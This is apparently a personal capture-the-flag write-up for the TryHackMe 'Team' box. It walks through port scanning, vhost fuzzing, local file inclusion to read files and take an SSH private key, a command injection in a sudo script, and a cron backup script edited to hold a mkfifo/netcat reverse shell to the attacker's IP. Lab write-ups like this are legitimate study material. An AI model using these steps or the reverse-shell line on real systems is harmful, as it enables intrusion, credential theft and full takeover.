- - - 
created : 25-07-2025 

Tags : #easy 
- - - 
# Objective

**Please allow 3-5 minutes for the box to boot**
# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ rustscan -a team.thm -- -A 
 
Open 10.10.168.250:21
Open 10.10.168.250:22
Open 10.10.168.250:80
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Team
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
```

# Enumeration

## HTTP(80)

### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://team.thm  

/.hta                 (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/index.html           (Status: 200) [Size: 2966]
/robots.txt           (Status: 200) [Size: 5]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]
Progress: 4746 / 4747 (99.98%)

```

![Pasted image 20250725204448.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725204448.png)

![Pasted image 20250725204548.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725204548.png)
### FFuf

Using [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to fuzz vhosts :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.team.thm' -u http://team.thm -fs 11366 -c
________________________________________________

dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 60ms]
www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 57ms]
:: Progress: [20478/20478] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:37] :: Errors: 0 ::

```

We use [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) to add them :

![Pasted image 20250725205143.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725205143.png)

`dev.team.thm` :

![Pasted image 20250725205220.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725205220.png)
![Pasted image 20250725205306.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725205306.png)

### Caido

We can try [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) with [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) :

![Pasted image 20250725210416.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725210416.png)

![Pasted image 20250725211146.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725211146.png)

![Pasted image 20250725211342.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725211342.png)

And we can retrieve the first flag:

![Pasted image 20250725211728.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725211728.png)
# Exploit

We retrieve `dale` [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) private key, i did it wit [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) and a [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) wordlist (i tried not URL encoded and didn't worked):

![Pasted image 20250725215329.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250725215329.png)
## SSH First Access

We save it and make it executable with `chmod 600 id_dale` then use it:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
└─$ ssh -i id_dale dale@team.thm                                                          
Last login: Mon Jan 18 10:51:32 2021
dale@ip-10-10-168-250:~$ ls
user.txt
dale@ip-10-10-168-250:~$ cat user.txt
THM{6Y0TXHz7c2d}
```

We have again the flag, retrievable from [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) with [Local File Inclusion (LFI)](../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) .
# Lateral Movement - Privilege Escalation

We can start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) by checking permissions :

```bash
dale@ip-10-10-168-250:/home$ sudo -l
Matching Defaults entries for dale on ip-10-10-168-250:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-10-168-250:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@ip-10-10-168-250:/home$ cd gyles
dale@ip-10-10-168-250:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"

```

We’ll be injecting in the error variable since we see that the variable is directly passed to a system call:

```bash
dale@ip-10-10-168-250:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: name
Enter 'date' to timestamp the file: /bin/bash
The Date is /bin/bash
id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Now we have a shell as the user Gyle.

Also, going through “.bash_history”, we see a trace of Cronjob running.

Since, going through the file we see that it’s a bash script that copies some backups, we decided to edit the file and add a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) since we knew that a Cronjob was being executed:

```bash
cat main_backup.sh        
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.250.11.13 1337 >/tmp/f
```

We setup a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and wait for root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/Scrivania]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

Pwned !!